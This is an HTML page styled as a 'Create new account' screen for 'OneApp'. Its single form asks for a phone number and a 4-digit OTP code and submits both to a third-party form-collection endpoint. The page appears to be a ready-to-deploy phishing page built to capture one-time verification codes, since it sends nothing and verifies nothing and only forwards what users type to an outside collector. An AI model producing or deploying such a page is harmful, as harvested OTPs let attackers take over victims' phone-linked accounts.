<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create new account</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Custom CSS code */
        body {
            background-color: black;
            color: aliceblue;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Style for form container */
        form {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Style for submit button */
        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: black;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        /* Hover effect for submit button */
        button[type="submit"]:hover {
            background-color: #ffffff;
            color: #000000;
        }

        /* Additional styling for labels */
        label {
            display: block;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <h2 style="text-align: center;">Welcome To OneApp</h2>
    <form action="https://formbold.com/s/3njvp" method="post">
        <div class="mb-3">
            <label for="phone" class="form-label">Phone Number:</label>
            <input type="tel" class="form-control" id="phone" name="phone" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}" required>
        </div>
        <div class="mb-3">
            <label for="otp" class="form-label">OTP Code:</label>
            <input type="text" class="form-control" id="otp" name="otp" pattern="[0-9]{4}" required>
        </div>
        <button type="submit" class="btn btn-primary">Submit</button>
    </form>

    <!-- Bootstrap Bundle with Popper (Bootstrap JavaScript) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
